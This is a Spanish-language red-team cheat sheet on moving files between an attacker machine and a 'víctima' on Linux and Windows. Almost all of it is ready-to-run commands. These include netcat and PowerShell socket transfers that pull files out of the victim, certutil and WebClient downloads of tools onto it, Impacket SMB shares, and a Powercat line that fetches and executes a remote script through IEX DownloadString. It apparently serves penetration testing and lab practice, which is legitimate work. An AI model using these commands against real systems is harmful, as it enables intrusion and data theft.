---
title: Transferencia de archivo
type: docs
prev: docs/first-page
weight: 8
sidebar:
  open: false
---
## VERSION SIMPLE

### SCP

![imagen error](/images/red_team/transferencia_archivos/20241011151751.png)

### NETCAT(nc)

ejemplo de transferencia de archivos con nc ,netcat ,

![imagen error](/images/red_team/transferencia_archivos/20230830161333.png)

### OPENSSL

TRANSFERENCIA DE ARCHIVOS PRO DOCKER

HOST DESTINO TIEEN QUE CREAR  : SERVER.KEY Y SERVER.PEM

CREAR:

```bash
openssl req -x509 -newkey rsa:2048 -keyout server.key -out server.pem -days 365
```

PONERSE EN ESCUCHA :

```bash
openssl s_server -quiet -accept 4433 -cert server.pem -key server.key > archivo_recibido.txt
```

ENVIAR EL ARCHIVO DESDE ORIGEN:

!!! CAMBIAR LA IP

```bash
openssl s_client -quiet -connect <IP_DESTINO>:4433 < archivo.txt
```

### POWERSHELL

- TRANSFERENCIA DE WINDOWS A LINUX

- USANDO TCPCLIENT

ORIGEN (WINDOWS )

```powershell
(New-Object System.Net.Sockets.TcpClient("IP_DEL_SERVIDOR", 8888)).GetStream() | % { $file = [System.IO.File]::OpenRead("ruta_del_archivo_a_enviar.txt"); $buffer = New-Object byte[] 1024; while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { $_.Write($buffer, 0, $bytesRead) }; $file.Close(); $_.Close(); $_.Dispose() }
```

DESTINO (LINUX)

```bash
nc -l -p 8888 > archivo_recibido.txt
```

---

- USANDO PYTHON

ORIGEN (WINDOWS )

```powershell
python.exe -c "import socket; s=socket.socket(); s.connect(('IP_DEL_SERVIDOR', 8888)); f=open('ruta_del_archivo_a_enviar.txt', 'rb'); s.sendall(f.read()); f.close(); s.close()"
```

DESTINO (LINUX)

```bash
nc -l -p 8888 > archivo_recibido.txt
```

### PYTHON

script.py

```python
import urllib.request
import argparse
import os

def descargar_archivo(url, filename=None):
    ## Si no se proporciona nombre de archivo, se toma el nombre de la URL
    if filename is None:
        filename = os.path.basename(url)

    ## Descargar el archivo
    try:
        urllib.request.urlretrieve(url, filename)
        print(f'Archivo descargado correctamente como: {filename}')
    except Exception as e:
        print(f'Error al descargar el archivo: {e}')

if __name__ == "__main__":
    ## Configurar los argumentos
    parser = argparse.ArgumentParser(description="Descargar un archivo desde una URL")
    parser.add_argument("url", help="URL del archivo a descargar")
    parser.add_argument("-f", "--filename", help="Nombre del archivo de salida (opcional)")

    ## Parsear los argumentos
    args = parser.parse_args()

    ## Llamar a la función para descargar el archivo
    descargar_archivo(args.url, args.filename)

```

USO :

maquina origen :

```bash
python -m http.server 80
```

maquina destino :

```bash
python script.py http://10.10.10.1/chise 
```

## VERSION COMPLETA

### 🐧 **Linux**

#### 🔼 Subir archivos a la víctima (desde la máquina atacante)

##### 1. Simple HTTP Server (Python)

- **Atacante:**

```bash
python -m SimpleHTTPServer 80
```

- **Víctima:**

```bash
wget http://192.168.1.35/FiletoTransfer
## o
curl -o FiletoTransfer http://192.168.1.35/FiletoTransfer
```

##### 2. SCP (requiere SSH y credenciales)

- **Atacante:**

```bash
scp FiletoTransfer tester@192.168.1.39:/home/tester/iron/
```

##### 3. Netcat

- **Víctima:**

```bash
nc -lvp 4444 > FiletoTransfer
```

- **Atacante:**

```bash
nc 192.168.1.39 4444 -w 3 < FiletoTransfer
```

##### 4. FTP (Twisted)

- **Atacante:**

```bash
twistd -n ftp -r .
```

- **Víctima:**

```bash
wget ftp://192.168.1.35:2121/FiletoTransfer
```

---

#### 🔽 Bajar archivos de la víctima (hacia la máquina atacante)

##### 1. Simple HTTP Server (Python)

- **Víctima:**

```bash
python -m SimpleHTTPServer 8080
```

- **Atacante:**

```bash
wget http://192.168.1.39:8080/FiletoDownload
```

##### 2. Netcat

- **Atacante:**

```bash
nc -lvp 4444 > FiletoDownload
```

- **Víctima:**

```bash
nc 192.168.1.35 4444 -w 3 < FiletoDownload
```

##### 3. SCP

- **Atacante:**

```bash
scp tester@192.168.1.39:/home/tester/iron/FiletoDownload .
```

---

### 🪟 **Windows**

#### 🔼 Subir archivos a la víctima

##### 1. PowerShell (DownloadFile)

- **Atacante:**

```bash
python -m SimpleHTTPServer 8080
```

- **Víctima:**

```powershell
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.10.10.1:8080/FiletoTransfer','C:\Users\test\Desktop\FiletoTransfer')"
```

##### 2. Certutil.exe

- **Atacante:**

```bash
python -m SimpleHTTPServer 8080
```

- **Víctima:**

```cmd
certutil.exe -urlcache -split -f http://10.10.10.1:8080/FiletoTransfer FiletoTransfer
```

##### 3. Netcat

- **Víctima:**

```cmd
nc.exe -lvp 4444 > FiletoTransfer
```

- **Atacante:**

```bash
nc 10.10.10.2 4444 -w 3 < FiletoTransfer
```

##### 4. FTP (Twisted)

- **Atacante:**

```bash
twistd -n ftp -r .
```

- **Víctima:**

```cmd
ftp
open 10.10.10.1 2121
anonymous

get FiletoTransfer
bye
```

##### 5. SMB (Impacket)

- **Atacante:**

```bash
impacket-smbserver -smb2support test .
```

- **Víctima:**

```cmd
copy \\10.10.10.1\test\FiletoTransfer FiletoTransfer
```

---

#### 🔽 Bajar archivos de la víctima

##### 1. FTP con escritura

- **Atacante:**

```bash
python -m pyftpdlib -w
```

- **Víctima:**

```cmd
ftp
open 10.10.10.1 2121
anonymous

put FiletoDownload
bye
```

##### 2. Netcat

- **Atacante:**

```bash
nc -lvp 4444 > FiletoDownload
```

- **Víctima:**

```cmd
nc.exe 10.10.10.1 4444 -w 3 < FiletoDownload
```

##### 3. SMB (Impacket)

- **Atacante:**

```bash
impacket-smbserver -smb2support test .
```

- **Víctima:**

```cmd
copy FiletoDownload \\10.10.10.1\test\FiletoDownload
```

##### 4. Powercat

- **Víctima:**

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoDownload"
```

- **Atacante:**

```bash
wget http://10.10.10.2:4444/FiletoDownload
```

---
